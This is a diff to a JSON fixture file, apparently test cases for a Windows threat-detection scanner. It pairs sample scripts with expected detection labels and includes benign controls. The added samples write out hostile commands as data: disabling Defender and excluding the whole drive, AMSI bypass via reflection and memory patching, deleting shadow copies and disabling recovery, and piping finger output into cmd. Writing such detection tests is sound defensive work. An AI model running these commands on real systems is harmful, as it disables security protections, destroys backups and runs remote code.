@@ -342,7 +342,7 @@
   {
     "name": "lnk_padded_vt_ff.zip",
     "target": "..\\..\\Windows\\System32\\cmd.exe",
-    "args": "\u000b\u000c/c echo inert",
+    "args": "\u000b\f/c echo inert",
     "container": "zip",
     "expected": "shortcut_padded_arguments"
   },
@@ -394,6 +394,74 @@
     "name": "lnk_browser_url.lnk",
     "target": "..\\Program Files\\Edge\\msedge.exe",
     "args": "https://intranet.example/",
+    "expected": null
+  },
+  {
+    "name": "defender_realtime_off.ps1",
+    "text": "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true\r\n",
+    "expected": "win_defender_tamper"
+  },
+  {
+    "name": "defender_exclude_root.ps1",
+    "text": "Add-MpPreference -ExclusionPath C:\\ -Force\r\n",
+    "expected": "win_defender_tamper",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "defender_policy.reg",
+    "text": "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender]\r\n\"DisableAntiSpyware\"=dword:00000001\r\n",
+    "expected": "win_defender_tamper"
+  },
+  {
+    "name": "defender_service.cmd",
+    "text": "sc config WinDefend start= disabled\r\nsc stop WinDefend\r\n",
+    "expected": "win_defender_tamper",
+    "container": "zip"
+  },
+  {
+    "name": "defender_scoped_exclusion.ps1",
+    "text": "Add-MpPreference -ExclusionPath C:\\src\\inert-repo\r\nSet-MpPreference -DisableRealtimeMonitoring $false\r\n",
+    "expected": null
+  },
+  {
+    "name": "amsi_reflection.ps1",
+    "text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\r\n",
+    "expected": "win_amsi_bypass"
+  },
+  {
+    "name": "amsi_patch.ps1",
+    "text": "$p = [K32]::GetProcAddress($h, 'AmsiScanBuffer')\r\n$o = 0\r\n[K32]::VirtualProtect($p, [uint32]6, 0x40, [ref]$o)\r\n",
+    "expected": "win_amsi_bypass"
+  },
+  {
+    "name": "amsi_doc.md",
+    "text": "AMSI lets an application pass content to AmsiScanBuffer. Administrators audit AMSI events in the Defender log.\n",
+    "expected": null
+  },
+  {
+    "name": "shadow_delete.bat",
+    "text": "@echo off\r\nvssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled No\r\n",
+    "expected": "win_recovery_inhibit"
+  },
+  {
+    "name": "shadow_wmi.ps1",
+    "text": "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }\r\n",
+    "expected": "win_recovery_inhibit",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "shadow_list.bat",
+    "text": "vssadmin list shadows\r\nwbadmin get versions\r\n",
+    "expected": null
+  },
+  {
+    "name": "finger_pipe.cmd",
+    "text": "cmd /c start \"\" /min cmd /c \"finger inert@example.invalid | cmd\"\r\n",
+    "expected": "win_lolbin_download"
+  },
+  {
+    "name": "finger_query.txt",
+    "text": "finger alice@example.invalid prints the user's .plan file (RFC 1288).\n",
     "expected": null
   }
 ]
